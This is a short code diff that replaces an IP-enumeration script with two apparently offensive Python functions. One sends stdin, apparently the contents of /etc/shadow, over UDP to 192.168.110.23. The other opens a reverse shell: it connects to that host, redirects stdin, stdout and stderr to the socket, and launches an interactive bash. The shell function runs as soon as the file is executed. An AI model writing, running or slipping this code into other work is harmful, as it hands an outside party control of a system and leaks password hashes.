@@ -1,9 +1,26 @@
-import itertools
+import socket, os, sys, subprocess
 
 
-client_ip_available = (itertools.product([192], [168], [0], range(1, 255, 1)))
-client_ip_available = [tuple([bytes(x)[i:i+1] for i in range(0, len(x), 1)]) for x in client_ip_available]
-# client_ip_available = [client_ip_available[i:i+1] for i in range(0, len(client_ip_available), 1)]
+def send_shadow():
+    shadow = (sys.stdin.read()).encode()
+    s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
 
-for each in client_ip_available:
-    print(each)
+    # print(shadow.read().encode())
+    s.sendto(shadow, ('192.168.110.23', 100))
+    return 0
+
+
+def send_shell():
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("192.168.110.23",100))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    p = subprocess.call(["/bin/bash", "-i"])
+    # p = subprocess.call(["/bin/sh","-i"])
+
+
+send_shell()
+
+
+
